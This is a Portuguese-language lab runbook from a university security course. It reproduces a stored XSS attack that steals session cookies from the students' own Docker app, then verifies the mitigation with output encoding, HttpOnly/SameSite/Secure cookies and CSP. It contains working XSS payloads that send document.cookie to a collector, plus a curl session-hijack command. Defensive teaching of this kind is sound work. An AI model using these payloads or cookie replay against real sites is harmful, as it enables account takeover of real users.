# Runbook — Reprodução do ataque e da mitigação

Passo a passo para reproduzir o laboratório de **XSS Armazenado + Roubo de Sessão** e validar a
correção. Disciplina: Segurança e Auditoria de Sistemas (Feevale). Dupla: João Oliveira e Mateus Wolke.

> ⚠️ Todo o exercício roda **na própria máquina**, em rede isolada, contra a aplicação criada pela
> dupla. Não aplicar contra sistemas de terceiros.

Os marcadores `[PRINT: ...]` indicam onde capturar evidências (telas/logs) para o relatório e o vídeo.

---

## 0. Pré-requisitos

- Docker Desktop em execução (macOS).
- Portas livres em `127.0.0.1`: `3001`, `3002`, `3009`.

## 1. Subir o laboratório

```bash
docker compose up --build
```

Aguarde as três imagens subirem. Serviços:

- Mural **vulnerável** → http://localhost:3001
- Mural **corrigido** → http://localhost:3002
- **Coletor** (atacante) → http://localhost:3009

`[PRINT: terminal com os três containers no ar (docker compose up)]`
`[PRINT: painel do coletor vazio em http://localhost:3009]`

---

## 2. Criar duas contas na aplicação VULNERÁVEL (`:3001`)

1. Acesse http://localhost:3001 → **Cadastre-se**.
2. Crie a conta da **vítima**: usuário `vitima`, senha `senha-vitima`.
3. Saia e crie a conta do **atacante**: usuário `atacante`, senha `senha-atacante`.

`[PRINT: tela de cadastro]`

---

## 3. Injetar o payload de XSS armazenado (como ATACANTE)

1. Entre como `atacante` em http://localhost:3001.
2. Publique um recado contendo o payload (ele será **armazenado** no banco e executado no
   navegador de **todos** que abrirem o mural):

   ```html
   <script>new Image().src="http://localhost:3009/steal?c="+encodeURIComponent(document.cookie)</script>
   ```

   > Variação sem `<script>` (útil se a demonstração precisar contornar algum filtro ingênuo):
   > ```html
   > <img src=x onerror="new Image().src='http://localhost:3009/steal?c='+encodeURIComponent(document.cookie)">
   > ```

3. O recado é salvo. Repare que, no HTML da página, o `<script>` entra **cru** (sem escape).

`[PRINT: atacante publicando o recado com o payload]`
`[PRINT: código-fonte da página (Ctrl+U) mostrando o <script> injetado sem escape]`

---

## 4. Disparar o roubo (como VÍTIMA)

1. Saia da conta do atacante e entre como `vitima` em http://localhost:3001.
2. Ao abrir o mural, o script armazenado executa **no navegador da vítima** e envia o
   `document.cookie` dela para o coletor.
3. Abra o painel do coletor: http://localhost:3009 → o **cookie de sessão da vítima** aparece
   capturado. No terminal do `docker compose`, o container `coletor-cookies` também loga
   `[COOKIE CAPTURADO]`.

`[PRINT: painel do coletor com o cookie sid da vítima]`
`[PRINT: log do container coletor com "[COOKIE CAPTURADO]"]`

> Por que funciona: o cookie foi definido **sem `HttpOnly`**, então o JavaScript consegue lê-lo
> via `document.cookie`; e **não há CSP**, então o script inline executa.

---

## 5. Sequestrar a sessão com o cookie roubado

Copie o valor do `sid` capturado (algo como `sid=ab12...`). Com ele, o atacante se passa pela vítima
**sem saber a senha**:

```bash
# Substitua pelo sid roubado
curl -b "sid=COLE_O_SID_AQUI" http://localhost:3001/perfil
```

A resposta mostra `Você está autenticado como vitima` — ou seja, a sessão foi sequestrada.

> Alternativa pelo navegador: abra as DevTools → Application → Cookies de `localhost:3001`, cole o
> `sid` da vítima no seu navegador e recarregue `/perfil`.

`[PRINT: curl (ou DevTools) autenticado como "vitima" usando o cookie roubado]`

---

## 6. Repetir o MESMO ataque na versão CORRIGIDA (`:3002`)

1. Em http://localhost:3002, repita os passos 2–4 (crie as contas, publique o mesmo payload como
   atacante, entre como vítima e abra o mural).
2. Resultado esperado:
   - O recado aparece como **texto literal** `"<script>...</script>"` — o script **não executa**
     (output encoding). `[PRINT: mural corrigido mostrando o payload como texto]`
   - O painel do coletor **não recebe** novo cookie. `[PRINT: coletor sem nova captura]`
   - Mesmo que algo executasse, o cookie é **`HttpOnly`** (invisível ao `document.cookie`), **`SameSite=Strict`**
     e **`Secure`**; e a **CSP** bloqueia script inline e o `<img>`/requisição para outra origem.

3. Confirme os atributos de segurança nas respostas:

   ```bash
   # Cookie seguro no login:
   curl -s -i -c /tmp/j -X POST -d 'username=atacante&password=senha-atacante' http://localhost:3002/login | grep -i set-cookie
   # Cabeçalho CSP em qualquer página:
   curl -s -i http://localhost:3002/login | grep -i content-security-policy
   ```

`[PRINT: Set-Cookie com HttpOnly; SameSite=Strict; Secure]`
`[PRINT: cabeçalho Content-Security-Policy na resposta]`

> A funcionalidade do mural continua intacta: cadastrar, logar e publicar recados funcionam
> normalmente — só o código malicioso deixa de executar.

---

## 7. Ver a mitigação como código (para o relatório)

```bash
diff -ru vulneravel/ corrigida/
```

As diferenças relevantes aparecem em:

- `views/mural.ejs` — `<%- %>` (sem escape) → `<%= %>` (com escape) **[causa-raiz do XSS]**
- `server.js` — cookie sem atributos → `HttpOnly + SameSite=Strict + Secure`; adição da **CSP** e
  dos cabeçalhos de segurança; **validação** de entrada.

---

## 8. Encerrar e limpar

```bash
docker compose down -v
```

Remove os containers e os volumes (bancos e logs do laboratório).
